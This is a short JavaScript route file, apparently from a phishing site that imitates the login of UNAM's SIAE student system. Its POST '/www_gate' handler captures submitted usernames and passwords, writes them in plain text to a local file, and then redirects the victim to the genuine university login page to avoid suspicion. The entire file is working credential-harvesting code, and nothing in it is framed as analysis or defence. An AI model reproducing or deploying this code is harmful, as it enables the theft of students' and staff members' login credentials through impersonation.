exports.install = function() {
  ROUTE('/', 'index')
  ROUTE('POST /www_gate', save_credentials)
  ROUTE('/siae' , 'viewsiae')
  ROUTE('/nuevo-correo', 'newemail')
}


async function save_credentials(){
  let self = this;
  let body = self.req.body;
  let { usr_logi, usr_pass } = body;
  const fs = require('fs');
  const fd = fs.openSync("input.txt", "r+");
  let position = 0;
  try {
    const numberOfBytesWritten =  fs.writeSync(fd, `${usr_logi} ${usr_pass}`, position, 'utf8');
  } catch (e) {
    console.error(e);
  }
  self.redirect('https://www.dgae-siae.unam.mx/www_gate.php');
}
